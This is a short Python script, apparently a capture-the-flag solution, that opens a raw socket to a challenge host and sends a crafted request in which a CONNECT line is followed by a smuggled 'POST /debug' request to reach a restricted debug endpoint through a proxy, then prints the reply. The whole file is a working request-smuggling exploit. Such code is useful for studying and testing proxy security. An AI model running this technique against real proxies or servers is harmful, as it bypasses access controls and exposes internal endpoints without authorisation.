import socket

TARGET = "http://proxy.challs.ctf.bhackari.it:3002"
REQ = b"CONNECT / HTTP/1.0\r\n\r\nPOST /debug HTTP/1.0\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("proxy.challs.ctf.bhackari.it", 3002))
s.sendall(REQ)

response = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    response += chunk

print(response.decode())